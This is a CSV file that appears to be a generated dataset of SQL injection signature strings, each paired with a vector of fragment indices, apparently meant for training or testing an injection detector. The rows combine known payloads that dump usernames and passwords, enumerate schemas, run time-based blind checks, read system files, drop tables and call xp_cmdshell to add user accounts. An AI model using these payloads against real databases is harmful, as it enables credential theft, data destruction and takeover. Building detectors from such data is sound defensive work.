sig_vector,sig_string
"[47, 22, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2 = 1 union select 1,2,3  /*"
"[47, 47, 10]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  +"
"[14, 51, 81]"," or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[56, 47, 38]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select Count(*) from table)>0"
"[6, 57, 82]"," 1)) or union select 1,@@datadir,3 drop table sc3；"
"[47, 51, 54]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[32, 51, 52]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 sleep(5)"
"[32, 14, 32]"," union select 1,2,(database())  or  union select 1,2,(database()) "
"[59, 51, 1]"," (select count(*) from admin where len(*)>0)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[56, 51, 37]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 WAITFOR DELAY '0:0:5'"
"[4, 32, 6]","' and  union select 1,2,(database())  1)) or "
"[57, 51, 23]","union select 1,@@datadir,3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[6, 51, 54]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[49, 47, 36]"," union select 1,2,load_file('C://1.txt')union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[47, 47, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[50, 3, 54]"," 1 = 2 union all select user() '')) orunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[23, 47, 81]"," union select 1,username,password from users where id=2union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  create table test like users;"
"[47, 23, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[30, 51, 78]"," select version()union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[57, 51, 80]","union select 1,@@datadir,3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 and 1=1;"
"[38, 1, 36]", (select Count(*) from table)>0') or (select @@version）
"[32, 47, 55]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  order by 1"
"[32, 54, 59]"," union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select count(*) from admin where len(*)>0)"
"[56, 2, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)‘') or"
"[47, 1, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 47, 37]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  WAITFOR DELAY '0:0:5'"
"[6, 51, 26]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[56, 51, 46]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),31"
"[36, 17, 74]", (select @@version） ' and 1=2 ;drop table test;
"[11, 57, 36]"," ) or union select 1,@@datadir,3 (select @@version）"
"[47, 23, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2 = 1 union select 1,2,3  /*"
"[50, 47, 6]"," 1 = 2 union all select user() union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or "
"[20, 21, 78]"," exists (select * from sysobjects) select * from users where id=1  = 1 union select 1,2,3  /*"
"[47, 2, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ‘ = 1 union select 1,2,3  /*"
"[26, 54, 20]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 exists (select * from sysobjects)"
"[0, 35, 47]","'' or delete table dirs union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[56, 17, 81]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) ' and 1=2 create table test like users;"
"[51, 51, 1]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[78, 2, 78]"," = 1 union select 1,2,3  /*‘ = 1 union select 1,2,3  /*"
"[54, 51, 53]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 if(length(database())=8,sleep(5),1)"
"[44, 51, 1]","create table dirs(paths varchar(100), id int)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[1, 82, 78]","') or drop table sc3； = 1 union select 1,2,3  /*"
"[47, 82, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3； = 1 union select 1,2,3  /*"
"[47, 63, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 1 = 1 union select 1,2,3  /*"
"[32, 43, 27]"," union select 1,2,(database()) exec master.dbo.xp_cmdshell 'net user username password /add' select * from users where id=1"
"[78, 51, 6]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[51, 54, 1]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3') or"
"[26, 29, 32]"," union select 1,1,1,load_file(c:\\boot.ini) 
 drop database db union select 1,2,(database()) "
"[56, 51, 29]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop database db"
"[51, 47, 24]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(if((user() regexp '^r'),1,0))"
"[20, 51, 13]"," exists (select * from sysobjects)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 admin'"
"[56, 51, 30]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select version()"
"[32, 63, 62]"," union select 1,2,(database()) 1 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[49, 6, 56]"," union select 1,2,load_file('C://1.txt') 1)) or union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[6, 11, 78]"," 1)) or  ) or  = 1 union select 1,2,3  /*"
"[47, 20, 5]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exists (select * from sysobjects)) and "
"[78, 56, 34]"," = 1 union select 1,2,3  /*union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) INSERT INTO"
"[47, 32, 1]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,(database()) ') or"
"[56, 82, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3；') or"
"[56, 12, 24]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)1 ' 1=(if((user() regexp '^r'),1,0))"
"[17, 32, 27]"," ' and 1=2 union select 1,2,(database())  select * from users where id=1"
"[7, 19, 49]","and 0 >< or'1'='1 union select 1,2,load_file('C://1.txt')"
"[5, 51, 78]",") and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[78, 51, 78]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[6, 2, 54]"," 1)) or ‘union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 51, 1]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[32, 55, 6]"," union select 1,2,(database())  order by 1 1)) or "
"[56, 51, 25]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[41, 19, 27]",exec master.dbo.sp_addlogin username or'1'='1 select * from users where id=1
"[32, 78, 78]"," union select 1,2,(database())  = 1 union select 1,2,3  /* = 1 union select 1,2,3  /*"
"[6, 51, 1]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[61, 51, 6]"," 1=(select name from master.dbo.sysdatabases where id=1)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[56, 26, 17]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,1,1,load_file(c:\\boot.ini) 
 ' and 1=2"
"[54, 41, 1]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3exec master.dbo.sp_addlogin username') or"
"[32, 7, 6]"," union select 1,2,(database()) and 0 >< 1)) or "
"[6, 47, 1]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or"
"[6, 51, 27]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1"
"[24, 47, 21]"," 1=(if((user() regexp '^r'),1,0))union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1 "
"[32, 0, 6]"," union select 1,2,(database()) '' or 1)) or "
"[68, 51, 1]"," */union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[20, 51, 23]"," exists (select * from sysobjects)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[31, 51, 78]"," benchmark(3000000,MD5(1))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[32, 34, 36]"," union select 1,2,(database())  INSERT INTO (select @@version）"
"[56, 68, 82]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) */ drop table sc3；"
"[82, 51, 61]"," drop table sc3；union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(select name from master.dbo.sysdatabases where id=1)"
"[82, 51, 38]"," drop table sc3；union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select Count(*) from table)>0"
"[49, 47, 78]"," union select 1,2,load_file('C://1.txt')union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[56, 51, 58]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select count(*) from sysobjects)"
"[6, 6, 22]"," 1)) or  1)) or  union select 1,2"
"[57, 2, 6]","union select 1,@@datadir,3‘ 1)) or "
"[25, 51, 19]"," updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 or'1'='1"
"[6, 51, 57]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,@@datadir,3"
"[44, 57, 67]","create table dirs(paths varchar(100), id int)union select 1,@@datadir,3';--"
"[26, 34, 6]"," union select 1,1,1,load_file(c:\\boot.ini) 
 INSERT INTO 1)) or "
"[32, 67, 24]"," union select 1,2,(database()) ';-- 1=(if((user() regexp '^r'),1,0))"
"[62, 51, 43]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3exec master.dbo.xp_cmdshell 'net user username password /add'"
"[42, 51, 1]","exec master.dbo.sp_password null,username,passwordunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[47, 45, 54]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 extractvalue(1, concat(0x7e,@@version,0x7e))union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[32, 51, 43]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3exec master.dbo.xp_cmdshell 'net user username password /add'"
"[32, 51, 23]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[44, 6, 49]","create table dirs(paths varchar(100), id int) 1)) or  union select 1,2,load_file('C://1.txt')"
"[18, 51, 6]"," &&union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[47, 27, 1]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1') or"
"[32, 51, 68]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 */"
"[32, 11, 6]"," union select 1,2,(database())  ) or  1)) or "
"[14, 78, 13]"," or  = 1 union select 1,2,3  /* admin'"
"[6, 51, 29]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop database db"
"[35, 51, 65]"," delete table dirs union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ) --"
"[58, 51, 32]"," (select count(*) from sysobjects)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,2,(database()) "
"[42, 51, 6]","exec master.dbo.sp_password null,username,passwordunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[36, 51, 55]"," (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 order by 1"
"[32, 47, 23]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2"
"[55, 47, 23]"," order by 1union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2"
"[6, 51, 55]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 order by 1"
"[11, 47, 49]"," ) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,load_file('C://1.txt')"
"[13, 47, 80]"," admin'union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  and 1=1;"
"[37, 51, 78]"," WAITFOR DELAY '0:0:5'union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
